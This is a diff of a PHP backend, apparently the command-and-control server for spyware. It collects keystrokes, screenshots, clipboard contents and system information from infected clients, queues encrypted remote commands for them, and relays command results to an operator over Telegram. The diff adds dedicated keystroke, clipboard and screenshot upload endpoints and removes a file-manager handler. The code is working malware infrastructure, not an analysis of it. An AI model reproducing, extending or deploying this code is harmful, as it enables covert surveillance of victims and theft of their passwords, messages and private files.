@@ -1,13 +1,8 @@
 <?php
-require_once 'config.php';
-require_once 'crypto.php';
-require_once 'utils.php';
-require_once 'telegram_handler.php';
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-
-header('Content-Type: application/json; charset=utf-8');
+require_once __DIR__ . '/config.php';
+require_once __DIR__ . '/utils.php';
+require_once __DIR__ . '/crypto.php';
+require_once __DIR__ . '/telegram_handler.php';
 
 class ApiHandler
 {
@@ -17,89 +12,55 @@ class ApiHandler
     public function __construct()
     {
         try {
-            $this->crypto = new Crypto();
-            $this->connect_db();
-            $this->ensure_directories();
-        } catch (Exception $e) {
-            $this->log_error("Constructor Error: " . $e->getMessage());
-            http_response_code(500);
-            echo json_encode(['error' => 'Initialization failed'], JSON_UNESCAPED_UNICODE);
-            exit;
-        }
-    }
-
-    private function connect_db()
-    {
-        try {
             $this->pdo = new PDO(
                 "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
                 Config::$DB_USER,
                 Config::$DB_PASS,
                 [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
             );
+            $this->crypto = new Crypto();
         } catch (PDOException $e) {
-            $this->log_error("DB Connection Failed: " . $e->getMessage());
-            error_log("Database Error: " . $e->getMessage()); // خطای جدید
+            $this->log_error("Database connection failed: " . $e->getMessage());
             http_response_code(500);
-            echo json_encode(['error' => 'Database connection failed'], JSON_UNESCAPED_UNICODE);
+            echo json_encode(['error' => 'Server error'], JSON_UNESCAPED_UNICODE);
             exit;
         }
     }
 
-    private function ensure_directories()
-    {
-        foreach ([Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR] as $dir) {
-            if (!is_dir($dir)) {
-                mkdir($dir, 0755, true);
-            }
-        }
-    }
-
-
     public function handle_request()
     {
-        $raw = file_get_contents('php://input');
-        $json = json_decode($raw, true);
-
-        if (isset($json['update_id'])) {
-            file_put_contents(Config::$WEBHOOK_LOG, date('c') . " TELEGRAM: $raw\n", FILE_APPEND);
-            try {
-                TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $json);
-            } catch (Exception $e) {
-                $this->log_error("Error in TelegramHandler: " . $e->getMessage());
-                http_response_code(500);
-                echo json_encode(['error' => 'TelegramHandler error'], JSON_UNESCAPED_UNICODE);
-            }
-            return;
-        }
-        $action = $_POST['action'] ?? $_GET['action'] ?? '';
         $this->log_webhook();
-
-
-        if ($action === 'telegram_webhook') {
-            $update = json_decode(file_get_contents('php://input'), true);
-            TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $update);
+        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+            http_response_code(405);
+            echo json_encode(['error' => 'Method not allowed'], JSON_UNESCAPED_UNICODE);
             return;
         }
 
         if (!$this->verify_token()) {
-            http_response_code(403);
+            http_response_code(400);
             echo json_encode(['error' => 'Invalid token'], JSON_UNESCAPED_UNICODE);
             return;
         }
 
+        $action = $_GET['action'] ?? $_POST['action'] ?? '';
         switch ($action) {
-            case 'upload_data':
-                $this->handle_upload();
-                break;
             case 'get_commands':
                 $this->handle_get_commands();
                 break;
             case 'command_response':
                 $this->handle_command_response();
                 break;
-            case 'file_manager':
-                $this->handle_file_manager();
+            case 'upload_data':
+                $this->handle_upload_data();
+                break;
+            case 'upload_screenshot':
+                $this->handle_upload_screenshot();
+                break;
+            case 'upload_clipboard':
+                $this->handle_upload_clipboard();
+                break;
+            case 'upload_keystrokes':
+                $this->handle_upload_keystrokes();
                 break;
             default:
                 http_response_code(400);
@@ -109,7 +70,216 @@ class ApiHandler
 
     private function verify_token()
     {
-        return isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN;
+        $token = $_POST['token'] ?? '';
+        return $token === Config::$SECRET_TOKEN;
+    }
+
+    private function handle_get_commands()
+    {
+        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
+        if (empty($client_id)) {
+            http_response_code(400);
+            echo json_encode(['error' => 'Missing client_id'], JSON_UNESCAPED_UNICODE);
+            return;
+        }
+
+        $stmt = $this->pdo->prepare("
+            SELECT id, command
+            FROM commands
+            WHERE client_id = ? AND status = 'pending'
+            ORDER BY created_at ASC
+            LIMIT 10
+        ");
+        $stmt->execute([$client_id]);
+        $commands = $stmt->fetchAll(PDO::FETCH_ASSOC);
+
+        $formatted_commands = [];
+        foreach ($commands as $command) {
+            try {
+                $decrypted = json_decode($this->crypto->decrypt($command['command']), true);
+                $formatted_commands[] = [
+                    'id' => $command['id'],
+                    'command' => $command['command'], // ارسال دستور رمزگذاری شده
+                    'type' => $decrypted['type'] ?? 'unknown'
+                ];
+            } catch (Exception $e) {
+                continue; // رد کردن دستورات نامعتبر
+            }
+        }
+        
+
+        $stmt = $this->pdo->prepare("
+            INSERT INTO clients (client_id, last_seen)
+            VALUES (?, NOW())
+            ON DUPLICATE KEY UPDATE last_seen = NOW()
+        ");
+        $stmt->execute([$client_id]);
+
+        echo json_encode($formatted_commands, JSON_UNESCAPED_UNICODE);
+    }
+
+    private function handle_command_response()
+    {
+        try {
+            $command_id = Utils::sanitize_input($_POST['command_id'] ?? '');
+            if (empty($command_id)) {
+                $this->log_error("Missing command_id in command_response");
+                http_response_code(400);
+                echo json_encode(['error' => 'Missing command_id'], JSON_UNESCAPED_UNICODE);
+                return;
+            }
+
+            if (!isset($_POST['result'])) {
+                $this->log_error("Missing result in command_response");
+                http_response_code(400);
+                echo json_encode(['error' => 'Missing result'], JSON_UNESCAPED_UNICODE);
+                return;
+            }
+
+            try {
+                $result = json_decode($this->crypto->decrypt($_POST['result']), true);
+                if ($result === null && json_last_error() !== JSON_ERROR_NONE) {
+                    throw new Exception("JSON decode failed: " . json_last_error_msg());
+                }
+            } catch (Exception $e) {
+                $this->log_error("Decryption or JSON decode failed in command_response: " . $e->getMessage());
+                http_response_code(400);
+                echo json_encode(['error' => 'Invalid result format'], JSON_UNESCAPED_UNICODE);
+                return;
+            }
+
+            $stmt = $this->pdo->prepare("
+                UPDATE commands SET response = ?, status = 'completed', completed_at = NOW()
+                WHERE id = ?
+            ");
+            $stmt->execute([json_encode($result), $command_id]);
+
+            $chat_id = Utils::get_admin_chat_id($this->pdo);
+            if ($chat_id) {
+                $message = "Command #$command_id executed:\n<pre>" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) . "</pre>";
+                $response = TelegramHandler::send_telegram_message(
+                    $chat_id,
+                    $message,
+                    ['parse_mode' => 'HTML']
+                );
+                if (!$response) {
+                    $this->log_error("Failed to send Telegram message for command #$command_id");
+                }
+            }
+
+            echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
+        } catch (Exception $e) {
+            $this->log_error("Error in handle_command_response: " . $e->getMessage());
+            http_response_code(500);
+            echo json_encode(['error' => 'Server error'], JSON_UNESCAPED_UNICODE);
+        }
+    }
+
+    private function handle_upload_data()
+    {
+        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
+        $keystrokes = $_POST['keystrokes'] ?? '';
+        $system_info = $_POST['system_info'] ?? '';
+    
+        if (empty($client_id) || empty($keystrokes) || empty($system_info)) {
+            $this->log_error("Missing parameters: client_id=$client_id, keystrokes=" . (empty($keystrokes) ? 'empty' : 'present') . ", system_info=" . (empty($system_info) ? 'empty' : 'present'));
+            http_response_code(400);
+            echo json_encode(['error' => 'Missing parameters'], JSON_UNESCAPED_UNICODE);
+            return;
+        }
+    
+        try {
+            $keystrokes_decrypted = $this->crypto->decrypt($keystrokes);
+            $system_info_decrypted = json_decode($this->crypto->decrypt($system_info), true);
+            if ($system_info_decrypted === null) {
+                throw new Exception("Invalid system_info JSON");
+            }
+    
+            $stmt = $this->pdo->prepare("
+                INSERT INTO client_data (client_id, keystrokes, system_info, received_at)
+                VALUES (?, ?, ?, NOW())
+            ");
+            $stmt->execute([$client_id, $keystrokes_decrypted, json_encode($system_info_decrypted)]);
+    
+            echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
+        } catch (Exception $e) {
+            $this->log_error("Upload data failed: " . $e->getMessage());
+            http_response_code(500);
+            echo json_encode(['error' => 'Server error: ' . $e->getMessage()], JSON_UNESCAPED_UNICODE);
+        }
+    }
+
+    private function handle_upload_screenshot()
+    {
+        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
+        $image_data = $_POST['image_data'] ?? '';
+
+        if (empty($client_id) || empty($image_data)) {
+            http_response_code(400);
+            echo json_encode(['error' => 'Missing parameters'], JSON_UNESCAPED_UNICODE);
+            return;
+        }
+
+        $image_data = $this->crypto->decrypt($image_data);
+        $filename = 'screenshots/' . $client_id . '_' . time() . '.png';
+        if (!file_exists('screenshots')) {
+            mkdir('screenshots', 0755, true);
+        }
+
+        file_put_contents($filename, base64_decode($image_data));
+
+        $stmt = $this->pdo->prepare("
+            INSERT INTO screenshots (client_id, filename, created_at)
+            VALUES (?, ?, NOW())
+        ");
+        $stmt->execute([$client_id, $filename]);
+
+        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
+    }
+
+    private function handle_upload_clipboard()
+    {
+        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
+        $clipboard_data = $this->crypto->decrypt($_POST['clipboard_data'] ?? '');
+
+        if (empty($client_id) || empty($clipboard_data)) {
+            http_response_code(400);
+            echo json_encode(['error' => 'Missing parameters'], JSON_UNESCAPED_UNICODE);
+            return;
+        }
+
+        $stmt = $this->pdo->prepare("
+            INSERT INTO clipboard_logs (client_id, content, created_at)
+            VALUES (?, ?, NOW())
+        ");
+        $stmt->execute([$client_id, $clipboard_data]);
+
+        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
+    }
+
+    private function handle_upload_keystrokes()
+    {
+        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
+        $keystrokes = $this->crypto->decrypt($_POST['keystrokes'] ?? '');
+
+        if (empty($client_id) || empty($keystrokes)) {
+            http_response_code(400);
+            echo json_encode(['error' => 'Missing parameters'], JSON_UNESCAPED_UNICODE);
+            return;
+        }
+
+        $stmt = $this->pdo->prepare("
+            INSERT INTO keystroke_logs (client_id, content, created_at)
+            VALUES (?, ?, NOW())
+        ");
+        $stmt->execute([$client_id, $keystrokes]);
+
+        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
+    }
+
+    private function log_error($message) {
+        $log_message = date('Y-m-d H:i:s') . " - ERROR - " . $message . " - File: " . __FILE__ . " - Line: " . __LINE__ . PHP_EOL;
+        file_put_contents(Config::$ERROR_LOG, $log_message, FILE_APPEND);
     }
 
     private function log_webhook()
@@ -123,118 +293,8 @@ class ApiHandler
         ];
         file_put_contents(Config::$WEBHOOK_LOG, json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
     }
-
-    private function handle_upload()
-    {
-        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
-        $keystrokes = $this->crypto->decrypt($_POST['keystrokes'] ?? '');
-        $system_info = json_decode($this->crypto->decrypt($_POST['system_info'] ?? ''), true);
-        $screenshot = $_FILES['screenshot'] ?? null;
-
-        $screenshot_path = null;
-        if ($screenshot && $screenshot['error'] === UPLOAD_ERR_OK) {
-            $screenshot_path = Config::$SCREENSHOT_DIR . time() . '_' . $client_id . '.png';
-            move_uploaded_file($screenshot['tmp_name'], $screenshot_path);
-        }
-
-        $this->pdo->prepare("
-            INSERT INTO client_data (client_id, keystrokes, screenshot_path, system_info, received_at)
-            VALUES (?, ?, ?, ?, NOW())
-        ")->execute([$client_id, $keystrokes, $screenshot_path, json_encode($system_info)]);
-
-        $this->pdo->prepare("
-            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
-            VALUES (?, NOW(), ?, ?)
-            ON DUPLICATE KEY UPDATE last_seen = NOW(), ip_address = ?, last_ip = ?
-        ")->execute([$client_id, $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown']);
-
-        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
-    }
-
-    private function handle_get_commands()
-    {
-        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
-
-        // افزودن بخش به‌روزرسانی وضعیت آنلاین کاربر
-        $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-        $this->pdo->prepare("
-            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
-            VALUES (?, NOW(), ?, ?)
-            ON DUPLICATE KEY UPDATE 
-                last_seen = NOW(), 
-                ip_address = VALUES(ip_address),
-                last_ip = VALUES(last_ip)
-        ")->execute([$client_id, $ip_address, $ip_address]);
-
-        // بقیه کد موجود
-        $stmt = $this->pdo->prepare("
-        SELECT id, command, created_at 
-        FROM commands
-        WHERE client_id = ? AND status = 'pending'
-        ORDER BY created_at DESC
-        LIMIT 10
-    ");
-        $stmt->execute([$client_id]);
-        $commands = $stmt->fetchAll(PDO::FETCH_ASSOC);
-
-        $this->pdo->prepare("UPDATE commands SET status = 'sent' WHERE client_id = ? AND status = 'pending'")
-            ->execute([$client_id]);
-
-        echo json_encode([
-            'commands' => array_map(function ($cmd) {
-                return [
-                    'id' => $cmd['id'],
-                    'command' => $cmd['command'],
-                    'type' => 'encrypted_command' // افزودن فیلد type
-                ];
-            }, $commands)
-        ], JSON_UNESCAPED_UNICODE);
-    }
-    private function handle_command_response()
-    {
-        $command_id = Utils::sanitize_input($_POST['command_id'] ?? '');
-        $result = json_decode($this->crypto->decrypt($_POST['result'] ?? ''), true);
-
-        $this->pdo->prepare("
-            UPDATE commands SET response = ?, status = 'completed', completed_at = NOW()
-            WHERE id = ?
-        ")->execute([json_encode($result), $command_id]);
-
-        $chat_id = Utils::get_admin_chat_id($this->pdo);
-        if ($chat_id) {
-            TelegramHandler::send_telegram_message(
-                $chat_id,
-                "Command #$command_id executed:\n" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT),
-                ['parse_mode' => 'HTML']
-            );
-        }
-
-        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
-    }
-
-    private function handle_file_manager()
-    {
-        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
-        $params = json_decode($this->crypto->decrypt($_POST['params'] ?? ''), true);
-        $command = [
-            'type' => 'file_operation',
-            'params' => $params
-        ];
-
-        $stmt = $this->pdo->prepare("
-            INSERT INTO commands (client_id, command, status, created_at)
-            VALUES (?, ?, 'pending', NOW())
-        ");
-        $stmt->execute([$client_id, $this->crypto->encrypt(json_encode($command))]);
-
-        echo json_encode(['status' => 'success', 'command_id' => $this->pdo->lastInsertId()], JSON_UNESCAPED_UNICODE);
-    }
-
-    private function log_error($message)
-    {
-        Utils::log_error($message);
-    }
 }
 
-$api = new ApiHandler();
-$api->handle_request();
+$handler = new ApiHandler();
+$handler->handle_request();
+?>
